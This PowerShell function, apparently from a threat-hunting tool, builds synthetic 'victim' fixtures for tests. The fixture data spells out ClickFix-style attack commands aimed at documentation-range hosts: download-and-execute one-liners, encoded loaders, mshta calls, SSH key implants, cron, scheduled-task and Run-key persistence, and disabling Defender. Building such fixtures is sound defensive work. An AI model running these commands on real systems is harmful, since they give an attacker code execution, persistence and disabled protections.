# placebo - New-PlaceboFixture: deterministic synthetic victim artifacts for demo/tests.
# every IOC is synthetic: RFC 5737 addresses, example.com hosts, fixed public hashes.

function New-PlaceboFixture {
    <#
    .SYNOPSIS
        forge a synthetic victim profile for demos and tests. deterministic output.
    .EXAMPLE
        New-PlaceboFixture -OutDir out/victim01 -Profile clickfix-enc
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][string]$OutDir,
        [ValidateSet('clickfix-basic', 'clickfix-enc', 'terminalfix', 'mixed')][string]$Profile = 'mixed'
    )

    $psr = Join-Path (Join-Path (Join-Path (Join-Path (Join-Path (Join-Path $OutDir 'AppData') 'Roaming') 'Microsoft') 'Windows') 'PowerShell') 'PSReadLine'
    $startup = Join-Path (Join-Path (Join-Path (Join-Path (Join-Path (Join-Path $OutDir 'AppData') 'Roaming') 'Microsoft') 'Windows') 'Start Menu') 'Programs'
    $startup = Join-Path (Join-Path $startup 'Startup') ''
    $startup = $startup.TrimEnd('/\\')
    foreach ($d in @($psr, $startup)) { New-Item -ItemType Directory -Force -Path $d | Out-Null }

    $encBlob = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(
        "iex(New-Object Net.WebClient).DownloadString('http://198.51.100.23/stage2.ps1')"
    ))

    $history = @(
        '# 2026-09-14 09:31:07 user opened chrome, visited "human verification" page'
        'ipconfig /flushdns'
        'powershell -w h -nop -ep bypass -c "iwr http://198.51.100.23/verify.ps1 -OutFile %TEMP%\v.ps1; iex (%TEMP%\v.ps1)"'
        'mshta http://203.0.113.84/captcha.hta'
    )
    $encHistory = @(
        '# 2026-09-14 09:31:07 same fake captcha, encoded flavor'
        'powershell -w h -nop -ep bypass -enc ' + $encBlob
        'cmd /c curl -s http://example.com/p | sh'
    )
    $termHistory = @(
        '# 2026-09-14 09:31:07 terminalfix flavor: clipboard swap + key drop'
        'Set-Clipboard -Value "curl http://198.51.100.23/s.sh | sh"'
        'echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKEKEYPLACEHOLDER0123456789abcdef operator@example.com >> ~/.ssh/authorized_keys'
        '(crontab -l 2>/dev/null; echo "*/15 * * * * curl -s http://198.51.100.23/beat.sh | sh") | crontab -'
    )

    switch ($Profile) {
        'clickfix-basic' { $hist = $history; $extra = @() }
        'clickfix-enc'   { $hist = $encHistory; $extra = @('stage2') }
        'terminalfix'    { $hist = $termHistory; $extra = @('keys') }
        'mixed'          { $hist = @($history + $encHistory + $termHistory); $extra = @('stage2', 'keys') }
        default          { $hist = @($history + $encHistory + $termHistory); $extra = @('stage2', 'keys') }
    }

    [System.IO.File]::WriteAllLines((Join-Path (Join-Path $psr '') 'ConsoleHost_history.txt'), $hist)

    # startup dropper (text .cmd so hunt can read it as text)
    $cmd = "@echo off`r`nrem synthetic - does nothing anywhere`r`nstart /min powershell -w h -nop -ep bypass -c `"iex([System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('$encBlob')))`""
    [System.IO.File]::WriteAllText((Join-Path $startup 'verify.cmd'), $cmd)

    if ($extra -contains 'stage2') {
        $stage = @(
            '# synthetic stage two - inert. urls are rfc 5737.'
            'Start-Process -WindowStyle Hidden mshta http://203.0.113.84/p.hta'
            'schtasks /create /tn "SystemVerify" /tr "powershell -w h -enc ' + $encBlob + '" /sc minute /mo 15 /f'
            'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Verify /t REG_SZ /d "powershell -w h -nop -c iex(http://198.51.100.23/b.ps1)" /f'
            'Set-MpPreference -DisableRealtimeMonitoring $true'
        ) -join "`r`n"
        [System.IO.File]::WriteAllText((Join-Path $OutDir 'stage2.ps1'), $stage)
    }
    if ($extra -contains 'keys') {
        [System.IO.File]::WriteAllText((Join-Path $OutDir 'operator_notes.txt'), (
            "synthetic fixture - profile $Profile`r`nhash of nothing: 9f2c4b1a0000000000000000000000000000000000000000000000000000000`r`ncontact: operator@example.com`r`n"
        ))
    }

    return (Resolve-Path -LiteralPath $OutDir).Path
}
